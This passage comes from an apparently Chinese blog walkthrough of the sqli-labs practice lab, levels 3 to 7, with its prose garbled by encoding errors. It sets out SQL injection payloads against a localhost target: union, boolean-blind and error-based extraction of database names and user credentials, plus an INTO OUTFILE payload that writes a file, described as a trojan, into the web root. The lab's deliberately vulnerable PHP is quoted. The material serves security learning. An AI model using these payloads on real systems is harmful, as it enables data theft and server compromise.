class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,database(),3 %23 //çˆ†æ•°æ®åº“</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-16-09.png"><br>æ¥ä¸‹æ¥åŒlevel1\2ï¼Œä¸å±•ç¤ºäº†</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p><strong>æŠ¥é”™-åŒå¼•å·-å°æ‹¬å·-å­—ç¬¦å‹-sqlæ³¨å…¥</strong>  </p><p>1ã€æµ‹åˆ¤æ–­å¦å­˜åœ¨ç®€å•æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; //æ­£å¸¸ï¼Œæ’é™¤å•å¼•å·æŠ¥é”™</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; //æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-27-15.png"><br>çœ‹åˆ°åŒå¼•å·ï¼Œåˆ¤æ–­ä¸º<strong>æŠ¥é”™-åŒå¼•å·-å°æ‹¬å·-å­—ç¬¦å‹-sqlæ³¨å…¥</strong>ï¼Œæ¨æµ‹åç«¯æŸ¥è¯¢è¯­å¥ä¸º<br><code>where id = (&quot;$id&quot;) LIMIT 0,1; </code><br>2ã€çˆ†å­—æ®µæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;) order by 4%23 //ä¿è¯é—­åˆå³å¯</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-13-25.png"><br>3ã€çˆ†æ˜¾æ€§å­—æ®µ   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-14-22.png"><br>4ã€çˆ†æ•°æ®åº“ã€è¡¨åã€å­—æ®µç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,database(),3 %23 //çˆ†æ•°æ®åº“å</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-17-52.png"><br>åé¢å’Œlevel1\2\3ä¸€æ ·ï¼Œä¸å±•ç¤ºäº†</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p><strong>æŠ¥é”™å›æ˜¾&#x2F;å¸ƒå°”-å­—ç¬¦å‹-æ³¨å…¥</strong><br>1ã€å¸ƒå°”æ³¨å…¥<br>å›æ˜¾åªæœ‰æ­£ç¡®å’Œæ— ï¼Œä½†æ˜¯åˆ¤æ–­ç¡®å®å­˜åœ¨æ³¨å…¥çš„æƒ…å†µã€‚<br>è®¾è®¡è¯­å¥è¿”å›true&#x2F;false ä¸€ç‚¹ç‚¹çˆ†ç ´æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1=1%23  æˆåŠŸé€šè¿‡ï¼Œå­˜åœ¨å¸ƒå°”æ³¨å…¥</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-23-08-21.png">  </p><p>å¸ƒå°”æ³¨å…¥å¸¸ç”¨å‡½æ•°åŠè¯­å¥:<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">str</span>)ï¼šè¿”å›<span class="built_in">str</span>å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</span><br><span class="line">substr(<span class="built_in">str</span>, pos, <span class="built_in">len</span>)ï¼šå°†<span class="built_in">str</span>ä»posä½ç½®å¼€å§‹æˆªå–<span class="built_in">len</span>é•¿åº¦çš„å­—ç¬¦è¿› è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»<span class="number">1</span>å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„<span class="number">0</span>å¼€å§‹</span><br><span class="line">mid(<span class="built_in">str</span>,pos,<span class="built_in">len</span>):è·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²</span><br><span class="line"><span class="built_in">ascii</span>(<span class="built_in">str</span>)ï¼šè¿”å›å­—ç¬¦ä¸²<span class="built_in">str</span>çš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼ã€‚</span><br><span class="line"><span class="built_in">ord</span>(<span class="built_in">str</span>):åŒä¸Šï¼Œè¿”å›<span class="built_in">ascii</span>ç </span><br><span class="line"><span class="keyword">if</span>(a,b,c) :aä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),è¿”å›<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¸ƒå°”æ³¨å…¥å¸¸ç”¨è¯­å¥ï¼š<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ¤æ–­æ•°æ®åº“é•¿åº¦ </span><br><span class="line"><span class="string">&#x27; or Length(database()) = 8 #è¿”å›trueè¯´æ˜æ•°æ®åº“é•¿åº¦ä¸º8</span></span><br><span class="line"><span class="string">2.è·å–æ•°æ®åº“åå­—</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="string">&#x27;ascillå€¼&#x27;</span><span class="comment">#</span></span><br><span class="line">ä¾æ¬¡è·å–</span><br><span class="line"><span class="number">3.</span>è·å–è¡¨çš„æ€»æ•°</span><br><span class="line"><span class="string">&#x27; or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#</span></span><br><span class="line"><span class="string">4.è·å–è¡¨çš„é•¿åº¦(ç¬¬ä¸€ä¸ªè¡¨)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (select length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES where TABLE_SCHEMA=database() limit <span class="number">0</span>,<span class="number">1</span> )= (çŒœæµ‹å¾—é•¿åº¦)<span class="comment">#</span></span><br><span class="line"><span class="number">5.</span>è·å–è¡¨çš„å†…å®¹</span><br><span class="line"><span class="string">&#x27; or  mid((select TABLE_NAME from information_schema.TABLES where </span></span><br><span class="line"><span class="string">TABLE_SCHEMA=database() limit 0,1),1,1)   = &#x27;</span>a<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">6.è·å–è¡¨çš„å­—æ®µçš„æ€»æ•°</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span>  (select count(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS where TABLE_NAME=è¡¨å ) = <span class="number">8</span><span class="comment">#8è¿”å›trueè¯´æ˜æœ‰8ä¸ªè¡¨</span></span><br><span class="line">ä¾æ¬¡ç±»æ¨,æœ€åæ¨å‡ºå†…å®¹</span><br></pre></td></tr></table></figure><p>å†™äº†ä¸€äº›è„šæœ¬ï¼Œé¡ºä¾¿å­¦ä¹ äº†pythonå¤šçº¿ç¨‹ã€‚<br>2ã€æŠ¥é”™æ³¨å…¥<a href="#refer-anchor-2"><sup>2</sup></a><br>(1). flooræŠ¥é”™æ³¨å…¥,ç”±äºfloor\count\group by è¿™ä¸‰ä¸ªå‡½æ•°å¯¼è‡´ï¼Œ<strong>åŸç†</strong><a href="#refer-anchor-3"><sup>3</sup></a>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat((payload),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a)</span><br><span class="line">```  </span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">çˆ†æ•°æ®åº“</span><br><span class="line">```python</span><br><span class="line">//payloadä¸ºselect database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">// <span class="number">0x7e</span> æ˜¯~,æ–¹ä¾¿è„šæœ¬æŠ“å–æ•°æ®</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨,å¯ä»¥æ ¹æ®è®¾ç½®æ˜¯å¦éœ€è¦ limitï¼Œè¿™é‡Œåªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼Œæ‰€ä»¥è¦ç”¨ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select table_name <span class="keyword">from</span> information_schema.tables where table_schema =database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema =database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select column_name <span class="keyword">from</span> information_schema.columnss where table_name =<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columnss where table_name =&#x27;</span>users<span class="string">&#x27; limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>æŠ¥æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥<br>éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°†,è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º64ä¸ªå­—ç¬¦</p><p>(2). updatexmlæŠ¥é”™æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,payload,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º32ä¸ªå­—ç¬¦,åªæœ‰åœ¨payloadè¿”å›çš„ä¸æ˜¯xmlæ ¼å¼æ‰ä¼šç”Ÿæ•ˆ</p><p>(3). ExtractValueæŠ¥é”™æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º32ä¸ªå­—ç¬¦</p><p>è¿™é‡Œåä¸¤ç§æ–¹æ³•æ²¡ååº”ï¼Œå¾…è¡¥</p><p>å‚è€ƒï¼š  </p><div id="refer-anchor-1"></div><ul><li><p>[1] <a href="https://segmentfault.com/a/1190000021795049">SQLæ³¨å…¥ä¹‹å¸ƒå°”æ³¨å…¥åŸç†</a></p><div id="refer-anchor-2"></div></li><li><p>[2] <a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label2">æŠ¥é”™æ³¨å…¥lv5</a></p><div id="refer-anchor-3"></div></li><li><p>[3] <a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQLæ³¨å…¥-æŠ¥é”™æ³¨å…¥</a></p></li><li><p>[3-1] <a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQLæ³¨å…¥å®æˆ˜ä¹‹æŠ¥é”™æ³¨å…¥ç¯‡</a></p></li></ul><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p><strong>å¸ƒå°”&#x2F;æŠ¥é”™-åŒå¼•å·-æ³¨å…¥</strong><br>æ”¹äº†ä¸€ä¸‹åå°æ˜¾ç¤ºï¼Œæ–¹ä¾¿å­¦ä¹ <br>1ã€æµ‹è¯•æ³¨å…¥  </p><p>æ— ä¿®é¥°ï¼Œid&#x3D;1<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-16-15.png"><br>åŠ å•å¼•å·ï¼Œid&#x3D;1â€™</p><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-23-49.png"><br>å¯¹æ¯”å‘ç°ç«Ÿç„¶æ²¡æœ‰æŠ¥é”™ï¼</p><p>åŠ åŒå¼•å·ï¼Œid&#x3D;1â€<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-25-52.png"><br>è¿™é‡Œå¯ä»¥ç›´è§‚çš„çœ‹åˆ°æŠ¥é”™åŸå› ï¼Œä»¥åŠsqlè¯­å¥å’ŒæŠ¥é”™ä¿¡æ¯ä¹‹é—´çš„å…³ç³»<br>åˆ¤æ–­ä¸º<strong>ä¸æ˜¾ç¤ºæŸ¥è¯¢ç»“æœçš„-æ³¢å°”&#x2F;æŠ¥é”™-åŒå¼•å·-æ³¨å…¥</strong><br>æ‰€ä»¥å’Œlevel-5ä¸€æ ·ï¼Œè¿™é‡Œä»…çˆ†æ•°æ®åº“ï¼Œå‰©ä½™ä¸å…·ä½“å±•ç¤º  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">6</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;  and updatexml(1,concat(0x7e,(database()),0x7e),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-34-09.png"></p><p>è¿™é‡Œå°±å¯ä»¥åšä¸ªæ€»ç»“äº†<br>æˆ‘ä»¬çœ‹ä¸€ä¸‹level 1~6 æŠ¥é”™å’Œsqlè¯­å¥çš„è”ç³»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">level-<span class="number">1</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">2</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">3</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">4</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&quot;1&quot;</span><span class="string">&quot;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-5</span></span><br><span class="line"><span class="string">    raw id: 1&#x27;</span></span><br><span class="line">    changed <span class="built_in">id</span> : <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-6</span></span><br><span class="line"><span class="string">    raw id: 1&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;1&quot;&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&quot;1&quot;&quot; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&quot;1&quot;</span><span class="string">&quot; LIMIT 0,1&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®°è¾“å…¥idå€¼ä¸ºraw_id,æœ¬åç«¯åŠ å·¥è¿‡åçš„idä¸ºchanged_id,åç«¯åŠ å·¥å‡½æ•°ä¸ºchange()ï¼ŒæŠ¥é”™sqlæ®µä¸ºsql_error<br>ä»¥sqli-labsä¸ºä¾‹ï¼Œä»–ä»¬çš„å…³ç³»åŸºæœ¬æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_error=<span class="string">&#x27;changed_id LIMIT 0ï¼Œ1&#x27;</span>= <span class="string">&#x27;chaged(id) LIMIT 0,1&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»æ­¤å¯ä»¥æ¨æ–­sqlè¯­å¥çš„idéƒ¨åˆ†ã€‚</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p><strong>å¸ƒå°”-åŒæ‹¬å·-å•å¼•å·-æ³¨å…¥</strong><br>æ²¡æœ‰å›æ˜¾ï¼Œåªæœ‰å¯¹æˆ–é”™ï¼Œå°è¯•ï¼Œæ— è§£ï¼Œä¸Šsqlmapï¼ŒsqlmapçœŸå¼ºå¤§ï¼<br><img src="/2022/02/17/sqli-labs/2022-02-19-17-38-55.png"><br>çœ‹çœ‹åå°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ‹¬å·ï¼Œè¿˜æ²¡æœ‰å›æ˜¾ï¼Œé‚£åªèƒ½sqlmapäº†ã€‚<br>å‡è®¾è¯•å‡ºäº†åŒæ‹¬å·ï¼Œè®¾ç½® <code>id=-1&#39;))</code>ï¼Œé‚£å°±å¯ä»¥å¸ƒå°”ç›²æ³¨å…¥äº†ï¼Œå…·ä½“å‚è€ƒlevel-5å¸ƒå°”æ³¨å…¥<br>è¿™é‡Œåªæµ‹è¯•åº“åé•¿åº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or 1=1%23  æˆåŠŸé€šè¿‡ï¼Œå­˜åœ¨å¸ƒå°”æ³¨å…¥</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-7/?id=-1&#x27;</span>)) <span class="keyword">or</span> length(database())=<span class="number">8</span>%<span class="number">23</span>  å¾—åˆ°åº“åé•¿åº¦</span><br></pre></td></tr></table></figure><p>æ ¹æ®åå­—æç¤ºå¯ä»¥å†™å…¥æœ¨é©¬æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)) union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p><code>0x74657374</code>æ˜¯<code>test</code>çš„asciiï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="/2022/02/17/sqli-labs/2022-02-20-10-10-51.png"><br>æç¤ºï¼š<br>mysqlå†™å…¥æ–‡ä»¶éœ€è¦æ‰“å¼€secure_file_priv</p><ul><li><p>ure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</p></li><li><p>å½“secure_file_privçš„å€¼ä¸º&#x2F;tmp&#x2F; 